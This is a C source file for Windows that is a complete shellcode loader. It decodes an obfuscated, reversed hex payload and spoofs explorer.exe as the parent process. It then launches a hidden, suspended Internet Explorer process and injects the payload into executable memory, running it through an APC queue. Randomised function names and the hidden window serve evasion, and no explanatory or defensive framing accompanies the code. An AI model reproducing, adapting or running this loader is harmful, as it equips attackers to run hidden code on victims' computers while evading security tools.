#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

DWORD zwYNlGnmR() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            //If you want to another process as parent change here
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

void YpnBkLlM(char* array, char* buf) {
	_strrev(array);
	while (*array) {
		if (' ' == *array) {
			array++;
			continue;
		}
		sscanf(array, "%02X", buf);
		array += 2;
		buf++;
	}
}


int main() {

    char hexbuffer[] = "7eff141e576f58846c92843c10845dfff58c9d20ab149f9884ad98840f98949c13d47c98943c98845dff5e354a85ab149c13842f988485140000010086951404a66f98e5024c38845dfff58c9d20ab149f9884851440a69c13d42e988401ce38845dff652a5b0f865e57ecff94c0470c585dff16475a99ab149f98842e98c4851401a67c98845dff0efdf0aeab141c98840cff842c98840cff840c13d49c13d40505e514a0a65dff00b60892ab14950000101086ae98c45dff706277c4ab141f98c44e98944514385f8a0c2d400020cb945e98940000100ace18846e9894651400002333f5233777eb94d5ffffffb49e21b884a59514850eff251402ce3884a51495148514a595e5851485140d10848840b8140d1094c104b84484c0b814660d10944204b844858d571d93548042c430c41f570e831c1014cad09c1c140c13846d10848843b8149c13d49cff84653e0d10940204b8448184b8050d108476470c58840000008808b80000002758f0151420b0818718660d1084c324b80225b88425de2e1c1014d09c1c1402c220c716c3ca0c13849c13d40527b884a4a47bf0840225b8848125b884650625b88456152d13842505141514000000cc8e0f4e3884cf";

	unsigned int memory_allocation = strlen(hexbuffer) / 2;

	char* buf = (char*)malloc(memory_allocation);

	if (NULL == buf) {
		printf("malloc error");
		return 1;
	}

	memset(buf, 0, memory_allocation);

    YpnBkLlM(hexbuffer, buf);

    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, zwYNlGnmR());

    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)buf, memory_allocation, lpNumberOfBytesWritten);

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    return 0;
}